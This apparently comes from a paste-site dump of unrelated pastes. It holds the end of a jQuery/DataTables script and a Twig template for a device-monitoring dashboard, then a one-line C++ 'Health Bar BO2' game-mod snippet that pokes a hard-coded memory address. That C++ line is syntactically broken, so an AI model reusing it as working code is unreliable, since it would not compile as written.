                strd = `<span data-toggle=""tooltip"" title=""${title}"">${strd}</span>`;
            }
            if (!(row.OutgoingLog_id === null)) {
              strd = ""&rArr;"";
              strd = escapeQuote(i18next.t(row.Command_Name)) + "" ("" + strd + "")"";
              if (row.IP_Name)
                strd = escapeQuote(i18next.t(row.IP_Name)) + "", "" + strd;
              title = i18next.t(""Command"");
              if (type == ""display"")
                strd = `<span data-toggle=""tooltip"" title=""${title}"" class=""text-${row.Hangupcause == 17 ? 'success' : 'danger'}"">${strd}</span>`;

            }
            if (!(row.DimProfile_id === null)) {
              strd = data;
              title = i18next.t(""Shedule"");
              if (type == ""display"")
                strd = `<span data-toggle=""tooltip"" title=""${title}""}"">${strd}</span>`;
            }
          }
          return strd;
        }
      }

    ]

  });

  dt.on(""draw"", function () {
    $('[data-toggle=""tooltip""]').tooltip();

  });

  dt.on(""init"", function () {
    $('[data-toggle=""tooltip""]').tooltip();
  });
  $('#stlog tbody').on('click', 'tr', function () {

    const rowData = dt.row(this).data();
    if (!rowData) return;
    liveMode = false;
    clearTimeout(renewTimer);
    $(""#btnLive"").prop(""disabled"", false);
    setSvgstate(rowData);
    setTextstate(rowData);

    $(this).addClass('table-primary').siblings().removeClass('table-primary');
  });
  $('#btnLive').on('click', () => {
    if (stlog?.rows?.length) {
      if (liveMode) return;
      liveMode = true;
      $(""#btnLive"").prop(""disabled"", true);
      $('#stlog tbody tr').removeClass('table-primary');

      onlogchane();
      renew();
    }
  });

}

async function attachBackground() {
  const $svg = $(""#circuit"").children(""svg"");
  if (!$svg.length || $(""#schemaWrapper"").length) return;

  let bgSrc = null;
  try {
    const res = await $.ajax({
      url: `${environment.base_url}/?do=api&fn=picture_list` +
          `&Devices_id=${get[""id""]}&order=ASC&limit=1&tag=bg`,
      type: ""GET"",
      dataType: ""json""
    });
    if (res.list?.length) bgSrc = res.list[0].src;
  } catch (e) {
    console.error(""BG fetch error:"", e);
  }

  if (!bgSrc) bgSrc = `${environment.base_url}/images/tl_default_bg.png`;

  $svg.wrap(
      '<div id=""schemaWrapper"" ' +
      '     style=""position:relative; display: flex;\n' +
      '    align-items: flex-end;\n' +
      '    justify-content: center;\n' +
      '    padding-bottom: 75px;margin-top: 5px;"">' +
      ""</div>""
  );
  $(""#schemaWrapper"").prepend(
      `<img id=""schemaBg"" ` +
      `     src=""${bgSrc}"" ` +
      `     style=""position:absolute;top:-10px; bottom: 0;left:-3px;width:100%;` +
      `            height:100%; object-fit: contain;object-position: left;z-index:1;pointer-events:none;"" />`
  );
  $svg.css({position: ""relative"", zIndex: 2, maxWidth: '60%', marginRight: '30%', marginBottom: '-70px'});
}"
rAvhYJMr,Untitled,eqeqwan21,HTML,Wednesday 28th of May 2025 05:23:25 AM CDT,"{% extends 'apppage.html' %}

{% block scripts %}
{{ parent() }}
<script src=""{{ base_uri }}/js/datatables.min.js?v={{ version }}""></script>
<script src=""{{ base_uri }}/js/datatableslocale.js?v={{ version }}""></script>
<script src=""{{ base_uri }}/js/moment-with-locales.js?v={{ version }}""></script>
<script src=""{{ base_uri }}/js/photoswipe/photoswipe.min.js?v={{ version }}""></script>
<script src=""{{ base_uri }}/js/photoswipe/photoswipe-ui-default.min.js?v={{ version }}""></script>
<script src=""{{ base_uri }}/js/photo.js?v={{ version }}""></script>
<script src=""{{ base_uri }}/js/obj.js?v={{ version }}""></script>

{% endblock %}

{% block stylesheets %}
{{ parent() }}
<link href=""{{ base_uri }}/css/datatables.min.css?v={{ version }}"" type=""text/css"" rel=""stylesheet"">
<link href=""{{ base_uri }}/js/photoswipe/photoswipe.css?v={{ version }}"" type=""text/css"" rel=""stylesheet"">
<link href=""{{ base_uri }}/js/photoswipe/aster-skin/default-skin.css?v={{ version }}"" type=""text/css"" rel=""stylesheet"">
<link href=""{{ base_uri }}/css/obj.css?v={{ version }}"" type=""text/css"" rel=""stylesheet"">
{% endblock %}

{% block content %}

<div class=""col-12 p-0"" id=""content"">

    <div class=""row pt-2"">

        <div class=""col-12 col-md-6"">

            <div class=""col-12 d-flex overflow-auto flex-nowrap mb-1"" id=""pg"">
                <button title=""{% trans"" Photo gallery
                "" %}"" data-toggle=""tooltip"" data-boundary=""viewport"" data-container=""body"" data-placement=""auto""
                class=""btn btn-primary btn-sm picture"" type=""submit""><i class=""fa fa-camera"" aria-hidden=""true""></i>
                </button>
            </div>

            <div id=""circuit"" style=""user-select: none;"" class=""col-12 p-0"">
            </div>
            <div class=""col-12 p-0"">
                <button id=""btnLive"" class=""btn btn-sm btn-outline-primary mb-2"">
                    🔄 Live
                </button>
            </div>

            <!добавление заголовка к журналу состояния с открытием полного журнала в новой вкладке>
            <strong><a id=""stlink"" target=""_blank"">{% trans ""State Log"" %}</a> </strong>
            <table id=""stlog"" class=""table table-hover table-sm"" data-order=""[]"">
                <thead>
                <tr>
                    <th></th>
                    <th>{% trans ""Time"" %}</th>
                    <th>{% trans ""Mode"" %}</th>
                    <th>{% trans ""St"" %}</th>
                    <th>{% trans ""Status"" %}</th>
                    <th>{% trans ""Event"" %}</th>
                </tr>
                </thead>
            </table>

        </div>

        <div class=""col-12 col-md-6"">
            <div class=""pl-1"">
                <strong>{% trans ""Serial number"" %}:</strong> <span id=""CustomNum""></span><br>
                <strong>{% trans ""Name"" %}:</strong> <span id=""Name""></span><br>
                <strong>{% trans ""SN"" %}:</strong> <span id=""sn""></span><br>
                <strong>{% trans ""Phone number"" %}:</strong> <span id=""Phone""></span><br>
                <strong>{% trans ""Default mode"" %}:</strong> <span id=""Mode""></span><br>
                <strong>{% trans ""Shedule profile"" %}:</strong> <span id=""DimProfile_Name""></span><br>
                <strong>{% trans ""Notification time"" %}:</strong> <span id=""ControlTime""></span><br>
                <strong>{% trans ""Place"" %}:</strong> <span id=""Location""></span><br>
                <strong>{% trans ""Station"" %}:</strong> <span id=""Station""></span><br>
            </div>

            <div class=""pl-1 mt-2"">
                <strong>{% trans ""State determination time"" %}:</strong> <span id=""StateTime""></span><br>
                <strong id=""strongState"">{% trans ""Switch State"" %}:</strong> <span id=""SwState""></span><br>
                <strong>{% trans ""Current Mode"" %}:</strong> <span id=""CurrentMode""></span><br>
                <strong>{% trans ""Daily schedule"" %}:</strong> <br>
            </div>

            <table id=""dimDetail"" class=""table table-sm table-responsive table-hover"">
                <thead>
                <tr class=""text-center"">
                    {% for i in 1..dim_width %}
                    <th scope=""col"">
                        <div class=""badge badge-light"">{% trans ""Step"" %} {{ i }}</div>
                    </th>
                    {% endfor %}
                </tr>
                </thead>
                <tbody>
            </table>
            <div class=""pl-1 mb-3"" id=""shiftdiv"">
                <strong>{% trans ""Shedule Shift"" %}:</strong> <span id=""shiftstr""></span>
            </div>
            <div class=""pl-1 mb-3"">
                <strong>{% trans ""Door status"" %}:</strong> <span id=""DoorStatus""></span><br>
                <strong>{% trans ""Profile sync"" %}:</strong> <span id=""SyncStatus""></span><br>
            </div>


            <div class=""col-12 pl-1"" id=""manualDiv"">
                <strong>{% trans ""Manual control"" %}:</strong>
                <form class=""form-inline"">
                    <div class=""input-group mb-1 col-12 p-0"">

                        <select id=""cmd"" class=""form-control"" onchange="""">
                        </select>

                        <div class=""input-group-append"">
                            <button id=""btnCmd"" class=""btn btn-primary"" type=""button"" onclick=""runCmd();"">{% trans
                                ""Send"" %}</i></button>
                        </div>

                    </div>
                </form>
            </div>

            <div id=""meterstat"">
                <div class=""col-12 text-center mt-2"">
                    <!открытие новой вкладки для журнала учёта>
                    <strong><a id=""meterlink"" target=""_blank"">{% trans ""Meter readings""%}</a> {% trans ""as of"" %}:
                    </strong><span id=""metertime""></span>
                </div>

                <table id=""meterlog"" class=""table table-hover table-sm"" data-order=""[]"" style=""min-width:100%"">
                    <thead>
                    <tr>
                        <th>{% trans ""Counter parameter"" %}</th>
                        <th>{% trans ""Value"" %}</th>
                    </tr>
                    </thead>
                </table>

            </div>

            <div id=""divstat"" class=""mb-1"">
                <div class=""col-12 text-center mt-2"">
                    <!открытие новой вкладки для журнала сигнализации>
                    <strong><a id=""statlink"" target=""_blank"">{% trans ""Received"" %}:</a> </strong><span
                        id=""iptime""></span>
                </div>
                <div id=""ipdata"" class=""text-monospace col-12 border border-gray rounded text-break"">
                </div>
            </div>

        </div>

    </div>


</div>

<div class=""d-none d-md-block"" id=""descktop-visible""></div>


{% endblock %}"
5t1TSPkZ,Health Bar BO2,xDuranceModz,C++,Wednesday 28th of May 2025 05:12:51 AM CDT,"void Healthbar()
{
drawShader(1000, 100, ((char*)((*(int*)0xE22F1 + 0x2CB)) 2, 20, Red);
}"
